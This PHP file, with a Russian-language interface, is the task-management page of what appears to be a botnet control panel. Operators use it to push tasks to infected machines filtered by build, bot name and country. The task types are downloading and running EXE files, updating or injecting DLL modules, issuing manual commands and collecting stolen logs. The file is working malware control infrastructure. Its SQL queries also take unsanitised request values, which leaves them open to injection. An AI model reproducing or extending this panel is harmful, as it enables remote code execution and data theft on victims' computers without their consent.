<?php

echo "
    <div style='padding: 20px'>  <div style='margin-bottom: 20px'>
    <a	class='razdel' href='?act=tasks'>Список</a>
    <a	class='razdel' href='?act=tasks&add'>Добавить</a>
    </div>";

if (isset($_GET['del']))
{
    $db -> query("DELETE FROM `tasks` WHERE tId={$_GET['del']}");
}

if (isset($_GET['stop']))
{
    $db -> query("UPDATE `tasks` SET `tState`='stopped' WHERE tId={$_GET['stop']}");
}

if (isset($_GET['continue']))
{
    $db -> query("UPDATE `tasks` SET `tState`='running' WHERE tId={$_GET['continue']}");
}

if (!isset($_GET['add']))
{
    $tasks = $db -> query('SELECT * FROM `tasks` ORDER BY tId DESC') -> fetchAllAssoc();

    echo "<table cellpadding='3' cellspacing='3' width='100%'><tr><td width='100%'>";

    echo "<table cellpadding='3' cellspacing='0' width='100%' class='light_table box' rules='all'>
            <tr><th>Задание</th><th>Описание</th><th>Счетчики</th><th>Действие</th></tr>";

    $count = 0;

    foreach ($tasks as $task)
    {
        $color = $count % 2 ? "#d3e7f0" : "#ebf4f8";

        switch ($task['tState'])
        {
            case "running":
                $tcolor = "green";
                break;
            case "stopped":
                $tcolor = "#ff1a00";
                break;
            case "finished":
                $tcolor = "#ffa500";
                break;
        }

        echo "<tr bgcolor='$color' onmouseover=\"this.style.background='#ffffff'\" onmouseout=\"this.style.background='$color'\">
                <td align='center'>
                    <span style='color:#808080'>Номер:</span> {$task['tId']}<br>
                    <span style='color:#808080'>Имя:</span> {$task['tName']}<br>
                    <span style='color:#808080'>Статус:</span> <span style='color:$tcolor'>{$task['tState']}</span>
                </td>

                <td align='center'><span style='color:#808080'>Билды:</span> {$task['tBuild']}<br>
                <span style='color:#808080'>Страны:</span> ".countryFromDB($task['tCountry1'], $task['tCountry2'], $task['tCountry3'], $task['tCountry4'])."<br>
                <span style='color:#808080'>Команда:</span> {$task['tViewCommand']}<br>
                <span style='color:#808080'>Только для чистых / Пометить грязними / Подтверждать выполнени</span> {$task['tOnlyForClean']} / {$task['tMarkAsDirty']} / {$task['tConfirm']}</td>

                <td align='center'>
                    <span style='color:#808080'>Нужно:</span> <span style='color:#ffa500'>{$task['tCount']}</span><br>
                    <span style='color:#808080'>Начали:</span> <span style='color:green'>{$task['tStartedCount']}</span><br>
                    <span style='color:#808080'>Завершили:</span> <span style='color:black'>{$task['tFinishedCount']}</span><br>
                    <span style='color:#808080'>Неудачно:</span> <span style='color:red'>{$task['tFailedCount']}</span></td>
                
                <td align='center'>";
				if($task['tState'] == 'running') {echo "<a href='?act=tasks&stop=".$task['tId']."'>Остановить</a><br>"; }
				else {echo "<a href='?act=tasks&continue=".$task['tId']."'>Возобновить</a><br>";}
				echo "
                <a href='?act=tasks&del=".$task['tId']."'>Удалить</a><br></td>
                </tr>";

        $count++;
    }
}
else
{
    $s = $db -> query("SELECT * FROM daily")->fetchAllAssoc('dayBuildId');

	echo "<form class='formee' action='?act=tasks&add' method='post' enctype='multipart/form-data'>
            <table cellpadding='3' cellspacing='3' width='100%'>
			
				<tr>
                    <td class='td_col_zag' width='40%'>Задание</td>
                    <td class='td_col_list' width='60%'>
                        <select style='width: 300px;' class='form' name='tasktype' id='tasktype' onchange='load_task_iface();'>
                            <option value='DownloadRunExeUrl'>Скачать и запустить EXE</option>
                            <option value='DownloadRunExeId'>Скачать с сервера и запустить EXE</option>
                            <option value='DownloadRunModId'>Скачать и обновить модуль DLL</option>
                            <option value='DownloadUpdateMain'>Скачать и обновить основной модуль EXE</option>
                            <option value='WriteConfigString'>Записать в конфиг</option>
                            <option value='Command'>Ввод команды вручную</option>
                            <option value='SendLogs'>Отправить логи</option>
                        </select>
                    </td>
                </tr>
			
                <tr>
                    <td class='td_col_zag' width='40%'>Имя</td>
                    <td class='td_col_list' width='60%'><input style='width: 300px;' name='tName' type='text' value=''></td>
                </tr>

                <tr>
                    <td class='td_col_zag' width='40%'>Билды</td>
                    <td class='td_col_list' width='60%'>";
						echo "<input type='checkbox' name='tBuild[ALL]' checked>Все билды&nbsp;&nbsp;";
                        foreach ($s as $b => $d) echo "<input type='checkbox' name='tBuild[$b]'>$b&nbsp;&nbsp;";
						

echo "              </td>
                </tr>
				
				<tr>
                    <td class='td_col_zag' width='40%'>Имена ботов<br><small>* - Любое имя бота<br>WIN7-ABCDEFG890;WIN8-ABEQEFQZ90 - через ';'</td>
                    <td class='td_col_list' width='60%'><input style='width: 300px;' name='tOnlyThisBots' type='text' value='*'></td>
                </tr>
		
				<tr id='autorun' style='display: none;'>
                    <td class='td_col_zag' width='40%'>Режим загрузки</td>
                    <td class='td_col_list' width='60%'>
                        <select style='width: 300px;' name='tRunMode'><option value=1>Одноразово</option><option value=2>Всегда</option></select>
                    </td>
                </tr>
		
                <tr>
                    <td class='td_col_zag' width='40%'>Статус</td>
                    <td class='td_col_list' width='60%'>
                        <select style='width: 300px;' name='tState'><option value='running'>Работает</option><option value='stopped'>Остановлено</option></select>
                    </td>
                </tr>
                
                <tr>
                    <td class='td_col_zag' width='40%'>Страны (<a id='aSelectAll' href=''#'>все</a>)</td>
                    <td class='td_col_list' width='60%'>";

						echo "<table style='width: 300px;' class='c111'>";
                        $Countries = countryListFromDB($db);
                        foreach (array_chunk($Countries, 7, true) as $CountriesChunk)
                        {
                            echo "<tr>";
                            foreach ($CountriesChunk as $Country => $CountryPresent)
                            {
                                $check = $CountryPresent ? 'checked' : '';
                                echo "<td><nobr>
                                <input id='fi$Country' type='checkbox' name='taskCountries[$Country]' value='1' $check>
                                <label for='fi$Country'>
                                <img src='img/c/".strtolower($Country).".gif'>&nbsp;$Country</label>
                                </nobr></td>";
                            }
                            echo "</tr>";
                        }
                        echo "</table>";
                echo "</td>
                </tr>

                <tr>
                    <td class='td_col_zag' width='40%'>Только для чистых</td>
                    <td class='td_col_list' width='60%'><input type='checkbox' name='tOnlyForClean'></td>
                </tr>

                <tr>
                    <td class='td_col_zag' width='40%'>Пометить грязными</td>
                    <td class='td_col_list' width='60%'><input type='checkbox' name='tMarkAsDirty'></td>
                </tr>

                <tr>
                    <td class='td_col_zag' width='30%'>Выполнений</td>
                    <td class='td_col_list' width='70%'><input style='width: 300px;' name='tCount' type='text' value=''></td>
                </tr>

                <tr>
                    <td class='td_col_zag' width='40%'>Подтверждать выполнение</td>
                    <td class='td_col_list' width='60%'><input type='checkbox' name='tConfirm' checked></td>
                </tr>

                <tr id='taskiface'><td class='td_col_zag' width='40%'>Линк</td><td class='td_col_list' width='60%'><input style='width: 300px;' name='tTaskLink' type='text' size='50'></td></tr>

                <tr><td>&nbsp;</td><td><input type='submit' value='Добавить' name='fAdd'></td></tr>

            </table>
            </form>";

    function GetFiledByFileId($name, $id)
    {
        global $db;

        $s = $db->query("SELECT $name FROM `files` WHERE fId = '$id'")->fetchAssoc();

        return $s[$name];
    }

    if (isset($_POST['fAdd']))
    {
        switch ($_POST['tasktype'])
        {
            case "DownloadRunExeUrl":
                $command = "main.DownloadRunExeUrl(%d,\"%s\",\"{$_POST['tTaskLink']}\")\r\n";
                $viewcommand = "Скачать и запустить EXE <span style='color:green'>{$_POST['tTaskLink']}</span>";
                break;

            case "DownloadRunExeId":
                $command = "main.DownloadRunExeId(%d,\"%s\",{$_POST['tCmdFile']})\r\n";
                $viewcommand = "Скачать с сервера и запустить EXE (номер,версия,имя)
                <span style='color:green'>{$_POST['tCmdFile']},".GetFiledByFileId('fVer', $_POST['tCmdFile']).",".GetFiledByFileId('fName', $_POST['tCmdFile'])."</span>";
                break;

            case "DownloadRunModId":
                $command = "main.DownloadRunModId(%d,\"%s\",{$_POST['tCmdFile']},\"".GetFiledByFileId('fName', $_POST['tCmdFile'])."\",".GetFiledByFileId('fVer', $_POST['tCmdFile']).",\"".GetFiledByFileId('fInject', $_POST['tCmdFile'])."\",\"".GetFiledByFileId('fConnectedWith', $_POST['tCmdFile'])."\",{$_POST['tRunMode']},\"".GetFiledByFileId('fArgs', $_POST['tCmdFile'])."\")\r\n";
                $viewcommand = "Скачать и обновить модуль DLL (номер,версия,имя,инжект,связан с модулем,режим запуска,аргументы)
                <span style='color:green'>{$_POST['tCmdFile']},".GetFiledByFileId('fVer', $_POST['tCmdFile']).",".GetFiledByFileId('fName', $_POST['tCmdFile']).",".GetFiledByFileId('fInject', $_POST['tCmdFile']).",".GetFiledByFileId('fConnectedWith', $_POST['tCmdFile']).",{$_POST['tRunMode']},".GetFiledByFileId('fArgs', $_POST['tCmdFile'])."</span>";
                break;  

            case "DownloadUpdateMain":
                $command = "main.DownloadUpdateMain(%d,\"%s\",{$_POST['tCmdFile']},".GetFiledByFileId('fVer', $_POST['tCmdFile']).")\r\n";
                $viewcommand = "Скачать и обновить основной модуль EXE (номер,версия,имя)
                <span style='color:green'>{$_POST['tCmdFile']},".GetFiledByFileId('fVer', $_POST['tCmdFile']).",".GetFiledByFileId('fName', $_POST['tCmdFile'])."</span>";
                break;

            case "WriteConfigString":
                $command = "main.WriteConfigString(%d,\"%s\",\"{$_POST['tSec']}\",\"{$_POST['tName']}\",\"{$_POST['tVal']}\")\r\n";
                $viewcommand = "Записать в конфиг (секция,переменная,значение)<span style='color:green'>{$_POST['tSec']},{$_POST['tName']},{$_POST['tVal']}</span>";
                break;

            case "Command":
                $command = $_POST['tTaskCommand'];
                $viewcommand = "Ввод команды вручную <span style='color:green'>{$_POST['tTaskCommand']}</span>";
                break;

            case "SendLogs":
                $command = "main.SendLogs(%d,\"%s\")\r\n";
                $viewcommand = "Отправить логи";
                break;
        }

        $Countries = countryListFromDB($db);
        foreach ($Countries as $k => $v) if (isset($_POST['taskCountries'][$k])) $TaskCountries[$k] = 1;
		
        foreach ($_POST['tBuild'] as $b => $c)
		{
			$builds[] = $b; if($b == 'ALL') break;
		}
        
        $task = array
        (
            'tName' => $_POST['tName'],
            'tPriority' => 0,
            'tBuild' => implode(', ', $builds),
            'tConfirm' => $_POST['tConfirm'] ? 'yes' : 'no',
            'tOnlyForClean' => $_POST['tOnlyForClean'] ? 'yes' : 'no',
            'tMarkAsDirty' => $_POST['tMarkAsDirty'] ? 'yes' : 'no',
            'tCount' => $_POST['tCount'],
            'tState' => $_POST['tState'],
            'tCommand' => $command,
            'tViewCommand' => $viewcommand,
            'tCountry1' => countryArrayToDB($TaskCountries),
            'tCountry2' => countryArrayToDB($TaskCountries),
            'tCountry3' => countryArrayToDB($TaskCountries),
            'tCountry4' => countryArrayToDB($TaskCountries),
            'tStartedCount' => 0,
            'tFinishedCount' => 0,
            'tFailedCount' => 0,
            'tCreateTime' => date('Y-m-d H:i:s', strtotime('now')),
			'tRunMode' => $_POST['tRunMode'],
			'tOnlyThisBots' => $_POST['tOnlyThisBots'],
        );

        if ($db -> insert('tasks', $task))
        {
            metaRefresh('?act=tasks');
        }
    }
}

?>